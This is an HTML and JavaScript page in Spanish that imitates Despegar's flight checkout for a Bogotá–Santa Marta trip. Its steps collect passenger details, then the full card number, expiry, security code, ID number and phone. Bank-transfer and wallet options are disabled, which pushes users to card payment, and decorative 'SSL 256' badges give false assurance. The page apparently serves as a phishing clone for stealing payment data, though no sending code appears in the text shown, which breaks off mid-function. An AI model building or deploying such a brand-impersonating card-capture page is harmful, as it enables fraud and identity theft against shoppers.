<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Despegar - Completar Reserva</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8fafc;
            min-height: 100vh;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            min-height: 100vh;
        }

        .header {
            background: white;
            border-bottom: 1px solid #e5e7eb;
            padding: 15px 30px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .logo {
            display: flex;
            align-items: center;
            font-size: 24px;
            font-weight: bold;
            color: #6366f1;
        }

        .logo::before {
            content: "▶";
            color: #6366f1;
            margin-right: 8px;
            font-size: 28px;
        }

        .back-link {
            color: #6366f1;
            text-decoration: none;
            font-size: 14px;
        }

        .help-link {
            color: #6b7280;
            font-size: 14px;
        }

        .main-content {
            display: grid;
            grid-template-columns: 1fr 350px;
            gap: 30px;
            padding: 30px;
        }

        .form-section {
            background: white;
        }

        .section-title {
            font-size: 28px;
            font-weight: bold;
            color: #1f2937;
            margin-bottom: 30px;
        }

        .step {
            display: none;
            animation: fadeIn 0.3s ease-in;
        }

        .step.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-weight: 600;
            color: #374151;
            margin-bottom: 8px;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .form-input, .form-select {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: white;
        }

        .form-input:focus, .form-select:focus {
            outline: none;
            border-color: #6366f1;
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .form-input::placeholder {
            color: #9ca3af;
            font-style: italic;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .form-row-3 {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 15px;
        }

        .country-selector {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            background: white;
            cursor: pointer;
        }

        .flag {
            width: 24px;
            height: 18px;
            background: linear-gradient(to bottom, #FFD700 33%, #4169E1 33%, #4169E1 66%, #DC143C 66%);
            border-radius: 2px;
            margin-right: 10px;
        }

        .radio-group {
            display: flex;
            gap: 20px;
            margin-top: 10px;
        }

        .radio-option {
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        .radio-option input[type="radio"] {
            margin-right: 8px;
            accent-color: #6366f1;
        }

        .expandable-section {
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .expandable-header {
            padding: 15px 20px;
            background: #f8fafc;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
        }

        .expandable-content {
            padding: 20px;
            display: none;
        }

        .insurance-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .insurance-card {
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .insurance-card:hover {
            border-color: #6366f1;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
        }

        .insurance-card.selected {
            border-color: #6366f1;
            background: #f8fafc;
        }

        .insurance-price {
            font-size: 32px;
            font-weight: bold;
            color: #1f2937;
            margin: 10px 0;
        }

        .insurance-features {
            list-style: none;
            margin-top: 15px;
        }

        .insurance-features li {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .insurance-features li::before {
            content: "✓";
            color: #10b981;
            font-weight: bold;
            margin-right: 8px;
        }

        .payment-method {
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }

        .payment-method:hover:not(.disabled) {
            border-color: #6366f1;
        }

        .payment-method.selected {
            border-color: #6366f1;
            background: #f8fafc;
        }

        .payment-method.disabled {
            background: #f9fafb;
            color: #9ca3af;
            border-color: #d1d5db;
            cursor: not-allowed;
        }

        .payment-method.disabled input[type="radio"] {
            cursor: not-allowed;
            opacity: 0.5;
        }

        .payment-method input[type="radio"] {
            margin-right: 12px;
        }

        .payment-alert {
            background: #fef3c7;
            border: 1px solid #f59e0b;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            color: #92400e;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .promotion-tag {
            background: #10b981;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
            margin-left: 10px;
        }

        .installments-section {
            background: #f8fafc;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            display: none;
        }

        .installments-section.active {
            display: block;
        }

        .security-info {
            display: flex;
            align-items: center;
            padding: 15px;
            background: #f8fafc;
            border-radius: 8px;
            margin-top: 20px;
        }

        .security-badges {
            display: flex;
            gap: 10px;
            margin-left: auto;
        }

        .security-badge {
            width: 40px;
            height: 30px;
            background: #6366f1;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 12px;
            font-weight: bold;
        }

        .sidebar {
            background: #f8fafc;
            padding: 25px;
            border-radius: 12px;
            height: fit-content;
            position: sticky;
            top: 100px;
        }

        .passport-card {
            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .price-detail {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid #e5e7eb;
        }

        .price-detail:last-child {
            border-bottom: none;
            font-weight: bold;
            font-size: 18px;
            padding-top: 15px;
        }

        .total-section {
            background: #f1f5f9;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }

        .flight-details {
            background: white;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            border: 1px solid #e5e7eb;
        }

        .flight-route {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }

        .flight-icon {
            color: #6366f1;
            margin: 0 15px;
            font-size: 18px;
        }

        .city {
            font-weight: bold;
            font-size: 18px;
            color: #1f2937;
        }

        .continue-btn {
            background: #6366f1;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .continue-btn:hover {
            background: #5a56eb;
            transform: translateY(-2px);
        }

        .step-indicator {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
            padding: 0 30px;
        }

        .step-dot {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #e5e7eb;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
            transition: all 0.3s ease;
        }

        .step-dot.active {
            background: #6366f1;
            color: white;
        }

        .step-dot.completed {
            background: #10b981;
            color: white;
        }

        .step-line {
            height: 2px;
            background: #e5e7eb;
            flex: 1;
            margin-right: 15px;
        }

        .step-line.completed {
            background: #10b981;
        }

        .summary-section {
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }

        .passenger-form {
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            background: #fafafa;
        }

        .passenger-header {
            font-size: 18px;
            font-weight: bold;
            color: #1f2937;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #e5e7eb;
        }

        @media (max-width: 768px) {
            .main-content {
                grid-template-columns: 1fr;
            }
            
            .form-row, .form-row-3, .insurance-options {
                grid-template-columns: 1fr;
            }
            
            .container {
                margin: 0;
            }
        }

        .error-message {
        color: red;
        font-size: 14px;
        margin-top: 8px;
        display: none;
        }

    </style>
</head>


<body>
    <div class="container">
        <div class="header">
            <div class="logo">despegar</div>
            <a href="resultados.html" class="back-link">« Volver a la página anterior</a>
        </div>

        <div class="step-indicator">
            <div class="step-dot active" id="step1">1</div>
            <div class="step-line" id="line1"></div>
            <div class="step-dot" id="step2">2</div>
            <div class="step-line" id="line2"></div>
            <div class="step-dot" id="step3">3</div>
            <div class="step-line" id="line3"></div>
            <div class="step-dot" id="step4">4</div>
            <div class="step-line" id="line4"></div>
            <div class="step-dot" id="step5">5</div>
            <div class="step-line" id="line5"></div>
            <div class="step-dot" id="step6">6</div>
        </div>

        <div class="main-content">
            <div class="form-section">
                <!-- PASO 1: Datos de los pasajeros -->
                <div class="step active" id="stepContent1">
                    <h1 class="section-title">¡Falta poco! Completa tus datos y finaliza tu compra</h1>
                    
                    <div class="form-group">
                        <h3 style="font-size: 20px; margin-bottom: 20px; color: #1f2937;">¿Quiénes viajan?</h3>
                    </div>

                    <div id="passengers-container">
                        <!-- Los formularios de pasajeros se generarán dinámicamente aquí -->
                    </div>

                    <button class="continue-btn" onclick="nextStep()">Continuar</button>
                    <div class="error-message" id="error-step1"></div>
                </div>


                <!-- PASO 2: Documentación requerida y equipaje -->
                <div class="step" id="stepContent2">
                    <div class="expandable-section">
                        <div class="expandable-header">
                            <span><strong>ℹ️ Documentación requerida</strong></span>
                            <span>▼</span>
                        </div>
                    </div>

                    <div class="expandable-section">
                        <div class="expandable-header">
                            <span><strong>🧳 Tus vuelos no incluyen equipaje</strong></span>
                            <span>▼</span>
                        </div>
                    </div>

                    <div style="border: 1px solid #e5e7eb; border-radius: 8px; padding: 20px; margin-bottom: 20px;">
                        <div style="display: flex; align-items: center; margin-bottom: 15px;">
                            <span style="font-size: 24px; margin-right: 15px;">🚌</span>
                            <div>
                                <h3>Traslado de ida y vuelta</h3>
                                <span class="promotion-tag">Mejor precio ahora</span>
                            </div>
                            <button style="margin-left: auto; padding: 8px 16px; background: #6366f1; color: white; border: none; border-radius: 6px;">Calcular precio</button>
                        </div>
                        <p style="color: #6b7280;">Viaja con todo ya organizado. Te llevamos a tu alojamiento y de regreso al aeropuerto de forma cómoda y segura.</p>
                    </div>

                    <div style="border: 1px solid #e5e7eb; border-radius: 8px; padding: 20px;">
                        <div style="display: flex; align-items: center; margin-bottom: 15px;">
                            <span style="font-size: 24px; margin-right: 15px;">🛡️</span>
                            <div>
                                <h3>Protégete ante imprevistos y gastos extras</h3>
                                <span class="promotion-tag">Mejor precio ahora</span>
                            </div>
                        </div>
                        <p style="color: #6b7280; margin-bottom: 20px;">Compra ahora tu asistencia y viaja con tranquilidad.</p>

                        <div class="insurance-options">
                            <div class="insurance-card">
                                <h4>Sin asistencia</h4>
                                <div class="insurance-price">$ 0</div>
                                <button style="width: 100%; padding: 8px; border: 2px solid #6366f1; background: white; color: #6366f1; border-radius: 6px;">Seleccionar</button>
                                <p style="margin-top: 15px; font-size: 14px;">¿Vas a viajar sin cobertura?</p>
                                <p style="font-size: 12px; color: #6b7280;">Contar con una asistencia te cubre en caso de imprevistos como</p>
                            </div>

                            <div class="insurance-card selected">
                                <h4>Plata Nacional</h4>
                                <p style="font-size: 14px; color: #6b7280;">15 oct. 2025 - 23 oct. 2025</p>
                                <div class="insurance-price">$ 10.773</div>
                                <p style="font-size: 14px;">Total: $ 96.950</p>
                                <button style="width: 100%; padding: 8px; background: #6366f1; color: white; border: none; border-radius: 6px;">Seleccionar</button>
                                <ul class="insurance-features">
                                    <li>Cancelación gratis</li>
                                    <li>Asistencia médica de hasta USD$ 6.000</li>
                                </ul>
                            </div>

                            <div class="insurance-card">
                                <h4>Oro Nacional</h4>
                                <p style="font-size: 14px; color: #6b7280;">15 oct. 2025 - 23 oct. 2025</p>
                                <div class="insurance-price">$ 11.446</div>
                                <p style="font-size: 14px;">Total: $ 103.009</p>
                                <button style="width: 100%; padding: 8px; border: 2px solid #6366f1; background: white; color: #6366f1; border-radius: 6px;">Seleccionar</button>
                                <ul class="insurance-features">
                                    <li>Cancelación gratis</li>
                                    <li>Asistencia médica de hasta USD$ 10.000</li>
                                </ul>
                            </div>
                        </div>
                    </div>

                    <button class="continue-btn" onclick="nextStep()">Continuar</button>
                </div>

                <!-- PASO 3: Método de pago -->
                <div class="step" id="stepContent3">
                    <h2 style="font-size: 24px; margin-bottom: 20px;">¿Cómo deseas pagar?</h2>
                    
                    <div class="payment-alert">
                        ⚠️ <strong>Promoción especial:</strong> Los descuentos solo aplican para pagos con tarjeta de crédito y débito.
                    </div>

                    <div style="margin-bottom: 30px;">
                        <h3 style="margin-bottom: 15px;">Destacado</h3>
                        <div class="payment-method disabled">
                            <label style="display: flex; align-items: center; cursor: not-allowed;">
                                <input type="radio" name="payment" value="nequi" disabled>
                                <span><strong>NEQUI</strong></span>
                                <span style="background: #9ca3af; color: white; padding: 2px 8px; border-radius: 4px; font-size: 12px; margin-left: 10px;">No disponible</span>
                            </label>
                        </div>
                    </div>

                    <div>
                        <h3 style="margin-bottom: 15px;">Más usados</h3>
                        
                        <div class="payment-method selected">
                            <label style="display: flex; align-items: center; cursor: pointer;">
                                <input type="radio" name="payment" value="credit" checked>
                                <span><strong>Tarjeta de crédito</strong></span>
                                <span class="promotion-tag">Hasta 15% OFF</span>
                            </label>
                        </div>

                        <div class="payment-method">
                            <label style="display: flex; align-items: center; cursor: pointer;">
                                <input type="radio" name="payment" value="debit">
                                <span><strong>Tarjeta de débito</strong></span>
                                <span class="promotion-tag">Hasta 10% OFF</span>
                            </label>
                        </div>

                        <div class="payment-method disabled">
                            <label style="display: flex; align-items: center; cursor: not-allowed;">
                                <input type="radio" name="payment" value="pse" disabled>
                                <span><strong>PSE</strong></span>
                            </label>
                        </div>

                        <p style="margin: 20px 0;">¿Tienes un cupón? <a href="#" style="color: #6366f1;">Ingresalo acá</a></p>
                    </div>

                    <button class="continue-btn" onclick="nextStep()">Continuar</button>
                </div>

                <!-- PASO 4: Datos de tarjeta -->
                <div class="step" id="stepContent4">
                    <h2 style="font-size: 24px; margin-bottom: 20px;">Ingresa los datos de la tarjeta</h2>
                    
                    <button style="background: #f3f4f6; border: 1px solid #d1d5db; padding: 10px 15px; border-radius: 6px; margin-bottom: 20px; display: flex; align-items: center; color: #6366f1;">
                        💳 Mostrar promociones, bancos y tarjetas
                    </button>

                    <div class="form-row">
                        <div class="form-group" style="position: relative;">
                        <label class="form-label">NÚMERO DE TARJETA</label>
                        <input type="text" class="form-input" id="card-number" placeholder="Ingresa el número de tu tarjeta" maxlength="19">
                        <img id="card-logo" src="" alt="" style="position: absolute; right: 15px; top: 40px; height: 25px; display: none;">
                        </div>

                        <div class="form-group">
                            <label class="form-label">TITULAR DE LA TARJETA</label>
                            <input type="text" class="form-input" placeholder="Como figura en la tarjeta">
                        </div>
                    </div>

                    <div class="form-row-3">
                        <div class="form-group">
                            <label class="form-label">VENCIMIENTO</label>
                            <input type="text" class="form-input" placeholder="MM/AA">
                        </div>
                        <div class="form-group">
                            <label class="form-label">CÓD. SEGURIDAD</label>
                            <input type="text" class="form-input">
                        </div>
                        <div class="form-group">
                            <label class="form-label">CÉDULA DE IDENTIDAD</label>
                            <input type="text" class="form-input">
                        </div>
                    </div>

                    <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">TELÉFONO DE CONTACTO</label>
                        <input type="text" class="form-input" id="phone-number" placeholder="Ej: 3101234567">
                    </div>
                    </div>

                    <div class="installments-section" id="installments-section">
                        <p style="font-weight: bold; margin-bottom: 15px;">¿En cuántas cuotas quieres pagar?</p>
                        <select class="form-select" id="installments-select">
                            <option value="1">1 cuota (sin interés)</option>
                            <option value="3">3 cuotas</option>
                            <option value="6">6 cuotas</option>
                            <option value="9">9 cuotas</option>
                            <option value="12">12 cuotas</option>
                            <option value="18">18 cuotas</option>
                            <option value="24">24 cuotas</option>
                            <option value="36">36 cuotas</option>
                        </select>
                    </div>

                    <div class="security-info">
                        <span>🔒 Este es un sitio seguro</span>
                        <p style="font-size: 14px; color: #6b7280; margin-left: 10px;">Protegemos tu información con conexiones seguras.</p>
                        <div class="security-badges">
                            <div class="security-badge">SSL</div>
                            <div class="security-badge">256</div>
                        </div>
                    </div>

                    <button class="continue-btn" onclick="nextStep()">Continuar</button>
                    <div class="error-message" id="error-step4"></div>
                </div>


                <!-- PASO 5: Datos de facturación -->
                <div class="step" id="stepContent5">
                    <h2 style="font-size: 24px; margin-bottom: 20px;">¿A nombre de quién emitimos la factura?</h2>
                    
                    <div class="form-group">
                        <label class="form-label">SITUACIÓN FISCAL</label>
                        <select class="form-select">
                            <option>Persona natural</option>
                            <option>Persona jurídica</option>
                        </select>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">NOMBRE</label>
                            <input type="text" class="form-input" placeholder="Ej. María Guadalupe" value="Ej. María Guadalupe">
                        </div>
                        <div class="form-group">
                            <label class="form-label">APELLIDO</label>
                            <input type="text" class="form-input" placeholder="Ej. Martínez" value="Ej. Martínez">
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">TIPO DE DOCUMENTO</label>
                            <select class="form-select">
                                <option>Cédula de ciudadanía</option>
                                <option>Cédula de extranjería</option>
                                <option>Pasaporte</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label class="form-label">CÉDULA DE CIUDADANÍA</label>
                            <input type="text" class="form-input">
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                        </div>
                        <div class="form-group">
                            <label class="form-label">CIUDAD</label>
                            <input type="text" class="form-input" value="Bogotá, Bogotá D.C., Colombia">
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">CALLE</label>
                        <input type="text" class="form-input">
                    </div>

                    <button class="continue-btn" onclick="nextStep()">Continuar</button>
                    <div class="error-message" id="error-step5"></div>
                </div>

                <!-- PASO 6: Resumen final -->
                <div class="step" id="stepContent6">
                    <h2 style="font-size: 24px; margin-bottom: 20px;">Antes de finalizar revisa los datos ingresados</h2>
                    
                    <div class="summary-section">
                        <div style="display: flex; align-items: center; margin-bottom: 15px;">
                            <span style="font-size: 20px; margin-right: 10px;">📅</span>
                            <h3>Fecha</h3>
                        </div>
                        <div class="summary-item">
                            <span>Ida: <strong id="summary-ida-fecha">-</strong></span>
                        </div>
                        <div class="summary-item">
                            <span>Vuelta: <strong id="summary-vuelta-fecha">-</strong></span>
                        </div>
                    </div>

                    <div class="summary-section">
                        <div style="display: flex; align-items: center; margin-bottom: 15px;">
                            <span style="font-size: 20px; margin-right: 10px;">👥</span>
                            <h3>¿Quiénes viajan?</h3>
                        </div>
                        <div id="summary-passengers">
                            <!-- Se llenará dinámicamente -->
                        </div>
                    </div>

                    <div class="summary-section">
                        <div style="display: flex; align-items: center; margin-bottom: 15px;">
                            <span style="font-size: 20px; margin-right: 10px;">💳</span>
                            <h3>Método de pago</h3>
                        </div>
                        <div class="summary-item">
                            <span id="summary-payment"><strong>Tarjeta de crédito</strong></span>
                            <span class="promotion-tag">Hasta 15% OFF</span>
                        </div>
                        <div class="summary-item" id="summary-installments" style="display: none;">
                            <span>Cuotas:</span>
                            <span id="summary-installments-text">1 cuota</span>
                        </div>
                    </div>

                    <div class="summary-section">
                        <div style="display: flex; align-items: center; margin-bottom: 15px;">
                            <span style="font-size: 20px; margin-right: 10px;">🛡️</span>
                            <h3>Asistencia al viajero</h3>
                        </div>
                        <div class="summary-item">
                            <span><strong>Plata Nacional</strong></span>
                            <span id="summary-insurance-cost">$ 10.773</span>
                        </div>
                    </div>

                    <div style="background: #10b981; color: white; padding: 20px; border-radius: 8px; text-align: center; margin: 30px 0;">
                        <h3 style="margin-bottom: 10px;">🎉 ¡Tu reserva está casi lista!</h3>
                        <p>Revisa todos los datos y confirma tu compra</p>
                    </div>

                    <div style="display: flex; gap: 15px;">
                        <button class="continue-btn" style="background: #6b7280;" onclick="previousStep()">Volver</button>
                        <button class="continue-btn" style="flex: 1;" onclick="finalizePurchase()">Finalizar Compra</button>
                    </div>
                </div>
            </div>

            <div class="sidebar">
                <h3 style="margin-bottom: 20px; color: #1f2937;">Detalle del pago</h3>
                
                <div class="passport-card">
                    <div>
                        <div style="font-size: 24px;">📋</div>
                    </div>
                    <div>
                        <div style="font-weight: 600;">Pasaporte Despegar</div>
                        <div style="font-size: 12px; opacity: 0.9;">Podrías sumar 7 puntos ></div>
                    </div>
                </div>

                <div class="price-detail">
                    <span id="flight-passengers-text">Vuelo para 1 persona</span>
                    <span id="flight-base-price">$ 190.400</span>
                </div>

                <div class="price-detail">
                    <span>Impuestos, tasas y cargos ⓘ</span>
                    <span id="flight-taxes">$ 102.213</span>
                </div>

                <div class="price-detail" id="insurance-cost" style="display: none;">
                    <span>Asistencia al viajero</span>
                    <span id="insurance-price">$ 10.773</span>
                </div>

                <div class="total-section">
                    <div class="price-detail">
                        <span>TOTAL</span>
                        <span id="total-price">$ 292.613</span>
                    </div>
                </div>

                <h3 style="margin: 25px 0 15px 0; color: #1f2937;">Detalle de la compra</h3>
                
                <div class="flight-details">
                    <div class="flight-route">
                        <div class="city" id="origin-city">Bogotá</div>
                        <div class="flight-icon">✈️</div>
                        <div class="city" id="destination-city">Santa Marta</div>
                    </div>
                    
                    <div style="color: #6b7280; font-size: 14px; line-height: 1.5; margin-bottom: 15px;">
                        <span id="trip-type-text">Ida y vuelta, 1 adulto</span><br>
                        <strong>IDA</strong><br>
                        <span id="departure-date">Mié. 15 oct. 2025</span>
                        <div style="margin-top: 10px;">
                            <strong>Horario:</strong> <span id="departure-time">07:03 → 08:32</span>
                        </div>
                    </div>
                    
                    <div style="display: flex; align-items: center; margin-bottom: 15px; padding-top: 10px; border-top: 1px solid #f3f4f6;">
    <!-- Logo de ida -->
                    <div id="airline-logo-ida"
                        style="width: 30px; height: 30px; background: #6366f1; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; margin-right: 10px;">
                        LA
                    </div>
                    <div>
                        <div style="font-weight: 600;" id="airline-name">LATAM Airlines Group</div>
                    </div>
                </div>

                    
                    <div style="display: flex; justify-content: space-between; font-size: 14px; color: #6b7280; margin-bottom: 10px;">
                        <span><strong id="origin-code">BOG</strong></span>
                        <span>Directo</span>
                        <span><strong id="destination-code">SMR</strong></span>
                    </div>

                    <div style="display: flex; justify-content: space-between; font-size: 14px; color: #6b7280;">
                        <span id="departure-time-detail">07:03</span>
                        <span id="flight-duration">1h 29m</span>
                        <span id="arrival-time-detail">08:32</span>
                    </div>

                    <!-- VUELTA -->
                    <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #f3f4f6;">
                        <div style="font-weight: 600; margin-bottom: 5px;">VUELTA</div>
                        <div style="color: #6b7280; font-size: 14px;" id="return-date">Jue. 23 oct. 2025</div>
                        <div style="margin-top: 5px;">
                            <strong>Horario:</strong> <span id="return-time">07:03 → 08:32</span>
                        </div>
                    </div>

                    <div style="display: flex; align-items: center; margin: 15px 0; padding-top: 10px; border-top: 1px solid #f3f4f6;">
                        <!-- Logo de vuelta -->
                        <div id="airline-logo-vuelta"
                            style="width: 30px; height: 30px; background: #6366f1; border-radius: 50%; 
                            display: flex; align-items: center; justify-content: center; color: white; 
                            font-weight: bold; margin-right: 10px;">
                            LA
                        </div>
                        <div>
                            <div style="font-weight: 600;" id="airline-name-vuelta">LATAM Airlines Group</div>
                        </div>
                    </div>

                    <div style="display: flex; justify-content: space-between; font-size: 14px; color: #6b7280; margin-bottom: 10px;">
                        <span><strong id="origin-code-return">SMR</strong></span>
                        <span>Directo</span>
                        <span><strong id="destination-code-return">BOG</strong></span>
                    </div>

                    <div style="display: flex; justify-content: space-between; font-size: 14px; color: #6b7280;">
                        <span id="return-departure-time">07:03</span>
                        <span id="return-flight-duration">1h 29m</span>
                        <span id="return-arrival-time">08:32</span>
                    </div>



            
                <div style="background: white; padding: 15px; border-radius: 8px; margin-top: 15px; border: 1px solid #e5e7eb;">
                    <h4 style="margin-bottom: 10px;">Política de cambios y cancelaciones</h4>
                    <div style="margin-bottom: 10px;">
                        <strong>Cambios</strong><br>
                        <span style="color: #10b981;">✓ Permite (con costo)</span>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <strong>Cancelación</strong><br>
                        <span style="color: #ef4444;">✗ No permite</span>
                    </div>
                    <a href="#" style="color: #6366f1; font-size: 14px;">Ver política de cambios y cancelaciones</a>
                </div>

                <div style="background: #1f2937; color: white; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center;">
                    <div style="margin-bottom: 10px;">ⓘ Ver política de cambios y cancelaciones</div>
                    <button style="background: #374151; color: white; border: none; padding: 8px 16px; border-radius: 6px;">Ver condiciones</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentStep = 1;
        const totalSteps = 6;
        let flightData = {};
        let passengersCount = 1;

        // Obtener parámetros de la URL al cargar la página
        // Obtener parámetros de la URL al cargar la página
document.addEventListener('DOMContentLoaded', function() {
    // Intentar leer del localStorage primero
    const storedFlight = JSON.parse(localStorage.getItem("selectedFlight"));

    if (storedFlight) {
        flightData = storedFlight;
        passengersCount = storedFlight.passengers || 1;
    } else {
        // Si no hay nada en localStorage, usar los parámetros de la URL como fallback
        const urlParams = new URLSearchParams(window.location.search);

        flightData = {
            airline: urlParams.get('airline') || 'LATAM Airlines Group',
            from: urlParams.get('from') || 'Bogotá',
            to: urlParams.get('to') || 'Santa Marta',
            dateIda: urlParams.get('dateIda') || 'Mié. 15 oct. 2025',
            dateVuelta: urlParams.get('dateVuelta') || 'Jue. 23 oct. 2025',
            departIda: urlParams.get('departIda') || '07:03',
            arriveIda: urlParams.get('arriveIda') || '08:32',
            departVuelta: urlParams.get('departVuelta') || '07:03',
            arriveVuelta: urlParams.get('arriveVuelta') || '08:32',
            price: parseInt(urlParams.get('price')) || 120000,
            passengers: parseInt(urlParams.get('passengers')) || 1
        };

        passengersCount = flightData.passengers;
    }

    // Ahora sí actualizar todo
    updateFlightDetails();
    generatePassengerForms();
    updatePricing();
    setupPaymentMethods();
    updateStepIndicator();
});


function updateFlightDetails() {
    // Aerolínea de ida
    const airlineIda = flightData.airlineIda || flightData.airline || "Aerolínea desconocida";
    const airlineCodeIda = airlineIda.split(" ").map(w => w[0]).join("").substring(0, 2).toUpperCase();
    document.getElementById('airline-name').textContent = airlineIda;

    const logoIda = document.getElementById('airline-logo-ida');
    if (logoIda) logoIda.textContent = airlineCodeIda;

    // Aerolínea de vuelta
    const airlineVuelta = flightData.airlineVuelta || flightData.airline || "Aerolínea desconocida";
    const airlineCodeVuelta = airlineVuelta.split(" ").map(w => w[0]).join("").substring(0, 2).toUpperCase();
    const airlineNameVueltaEl = document.getElementById('airline-name-vuelta');
    if (airlineNameVueltaEl) airlineNameVueltaEl.textContent = airlineVuelta;

    const logoVuelta = document.getElementById('airline-logo-vuelta');
    if (logoVuelta) logoVuelta.textContent = airlineCodeVuelta;

    // Ciudades y fechas
    document.getElementById('origin-city').textContent = flightData.from;
    document.getElementById('destination-city').textContent = flightData.to;
    document.getElementById('departure-date').textContent = flightData.dateIda;
    document.getElementById('return-date').textContent = flightData.dateVuelta;

    // Horarios
    document.getElementById('departure-time').textContent = `${flightData.departIda} → ${flightData.arriveIda}`;
    document.getElementById('return-time').textContent = `${flightData.departVuelta} → ${flightData.arriveVuelta}`;
    document.getElementById('departure-time-detail').textContent = flightData.departIda;
    document.getElementById('arrival-time-detail').textContent = flightData.arriveIda;
    document.getElementById('return-departure-time').textContent = flightData.departVuelta;
    document.getElementById('return-arrival-time').textContent = flightData.arriveVuelta;

    // Duración ida
    let durationIda = flightData.durationIda;
    if (!durationIda && flightData.departIda && flightData.arriveIda) {
        durationIda = calcularDuracion(flightData.departIda, flightData.arriveIda);
    }
    document.getElementById('flight-duration').textContent = durationIda || "Duración no disponible";

    // Duración vuelta
    let durationVuelta = flightData.durationVuelta;
    if (!durationVuelta && flightData.departVuelta && flightData.arriveVuelta) {
        durationVuelta = calcularDuracion(flightData.departVuelta, flightData.arriveVuelta);
    }
    document.getElementById('return-flight-duration').textContent = durationVuelta || "Duración no disponible";

    // Códigos de aeropuerto
    const airportCodes = {
        'Bogotá': 'BOG',
        'Santa Marta': 'SMR',
        'Medellín': 'MDE',
        'Cartagena': 'CTG',
        'Cali': 'CLO',
        'Barranquilla': 'BAQ',
        'San Andrés': 'ADZ'
    };

    // Para la IDA
    document.getElementById('origin-code').textContent = airportCodes[flightData.from] || '---';
    document.getElementById('destination-code').textContent = airportCodes[flightData.to] || '---';

    // Para la VUELTA
    document.getElementById('origin-code-return').textContent = airportCodes[flightData.to] || '---';
    document.getElementById('destination-code-return').textContent = airportCodes[flightData.from] || '---';

    // Texto pasajeros
    const passengerText = passengersCount === 1 ? '1 pasajero' : `${passengersCount} pasajeros`;
    document.getElementById('trip-type-text').textContent = `Ida y vuelta, ${passengerText}`;
}



        function calcularDuracion(horaInicio, horaFin) {
            const [horaI, minutoI] = horaInicio.split(':').map(Number);
            const [horaF, minutoF] = horaFin.split(':').map(Number);
            
            let inicio = new Date(0, 0, 0, horaI, minutoI);
            let fin = new Date(0, 0, 0, horaF, minutoF);
            
            if (fin < inicio) {
                fin.setDate(fin.getDate() + 1); // Ajustar para vuelos que pasan la medianoche
            }
            
            const diffMs = fin - inicio;
            const diffHrs = Math.floor(diffMs / 3600000); // horas
